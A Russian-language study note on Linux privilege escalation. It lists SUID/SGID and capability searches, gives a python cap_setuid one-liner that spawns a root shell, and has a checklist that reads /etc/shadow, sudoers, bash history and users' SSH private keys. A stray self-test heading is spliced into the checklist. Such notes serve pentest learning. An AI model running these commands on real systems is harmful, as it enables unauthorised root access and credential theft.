---
id: "j0cg9ymrjmmemyvhc"
title: "linux"
tags: []
isFavorite: false
order: 1
createdAt: "2026-03-06T08:32:06.624Z"
updatedAt: "2026-03-06T10:03:18.085Z"
---

Поиск SUID файлов:
```Bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```


Поиск SGID файлов:
```Bash
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

Проблема с SUID: Даёт ВСЕ права root, даже если нужно одно
Решение: Capabilities — гранулярные привилегии
Поиск файлов с capabilities:

```Bash
getcap -r / 2>/dev/null

# Пример вывода:
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python3.9 = cap_setuid+ep   ← ОПАСНО! Privesc!
```

Privesc через capability:
```Bash
# Если python имеет cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```


 LINUX PRIVILEGE ESCALATION CHECKLIST               
                                                                 
  1. КТО Я?                                                      
     id, whoami, groups                                          
                                                                 
  2. ЧТО МОГУ?                                                   
     sudo -l                          ← Очень важно!             
❓
 ВОПРОСЫ ДЛЯ САМОПРОВЕРКИ
Уровень 1: Базовое понимание
     cat /etc/sudoers                                            
     find / -perm -4000 2>/dev/null   ← SUID                     
     getcap -r / 2>/dev/null          ← Capabilities             
                                                                 
  3. ЧТО ЗДЕСЬ ЕСТЬ?                                            
     cat /etc/passwd                                             
     cat /etc/shadow                  ← Если читается            
     cat /etc/crontab                 ← Cron jobs                
     ls -la /etc/cron.*                                          
     ps aux                           ← Процессы                 
     netstat -tulnp                   ← Сервисы                  
                                                                 
  4. ЧТО ИНТЕРЕСНОГО?                                           
     find / -name "*.conf" 2>/dev/null                           
     find / -writable -type f 2>/dev/null                        
     grep -ri "password" /var/www 2>/dev/null                    
     cat ~/.bash_history                                         
     ls -la /home/*/                                             
     cat /home/*/.ssh/id_rsa 2>/dev/null                         
                                                                 
  5. ВЕРСИИ И ЭКСПЛОИТЫ                                         
     uname -a                         ← Версия ядра              
     cat /etc/os-release              ← Версия ОС                
     searchsploit linux kernel X.X    ← Эксплоиты                
                                                                 
  6. АВТОМАТИЗАЦИЯ                                              
     linpeas.sh                                                  
     linenum.sh                                                  
     linux-exploit-suggester.sh        